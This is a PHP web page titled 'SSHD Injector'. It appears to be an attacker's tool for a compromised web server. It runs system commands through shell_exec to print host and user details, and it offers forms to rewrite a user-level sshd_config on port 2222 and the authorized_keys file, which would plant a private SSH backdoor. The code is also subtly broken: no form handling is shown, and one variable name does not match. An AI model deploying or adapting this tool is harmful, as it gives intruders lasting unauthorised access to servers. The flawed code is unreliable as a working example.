<!DOCTYPE html>
<!-- Alexis Giraudet -->
<?php
$home = getenv("HOME");
if($home === FALSE)
{
    $home = ".";
}
$ssh_path = $home."/.ssh";
$authorized_keys = $ssh_path."/authorized_keys";
$sshd_path = $home."/.ssh";
$sshd_config = $sshd_path."/sshd_config";
$sshd_hostkey = $sshd_path."/ssh_host_key";
$sshd_pidfile = $sshd_path."/sshd.pid";
$sshd_port = 2222;
$sshd_default_config_content = "Port ".$sshd_port."\nHostKey ".$sshd_hostkey."\nUsePrivilegeSeparation no\nPidFile ".$sshd_pidfile."\n";
?>
<html>
    <head>
        <meta charset="utf-8" />
        <title>SSHD Injector</title>
    </head>
    <body>
        <p>
            <?php echo htmlentities(shell_exec("uname -a")); ?>
            <br>
            <?php echo htmlentities(shell_exec("id")); ?>
            <br>
            <?php echo htmlentities("HOME = ".getenv("HOME")); ?>
            <br>
            <?php echo htmlentities("PATH = ".getenv("PATH")); ?>
        </p>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update sshd_config</legend>
                <textarea name="sshd_config_content" required>
<?php
                    $sshd_config_content = @file_get_contents($sshd_config);
                    if($sshd_config_content === FALSE)
                    {
                        echo $sshd_default_config_content;
                    }
                    else
                    {
                        echo $sshd_config_content;
                    }
?>
                </textarea>
                <br />
                <input type="submit" value="Update sshd_config" />
            </fieldset>
        </form>
        <form method="post" action="<?php echo basename(__FILE__); ?>">
            <fieldset>
                <legend>Update authorized_keys</legend>
                <textarea name="authorized_keys_content" required>
<?php
                    $sshd_authorized_keys_content = @file_get_contents($sshd_authorized_keys);
                    if($sshd_authorized_keys_content === FALSE)
                    {
                        ;
                    }
                    else
                    {
                        echo $sshd_authorized_keys_content;
                    }
?>
                </textarea>
                <br />
                <input type="submit" value="Update authorized_keys" />
            </fieldset>
        </form>
    </body>
</html>
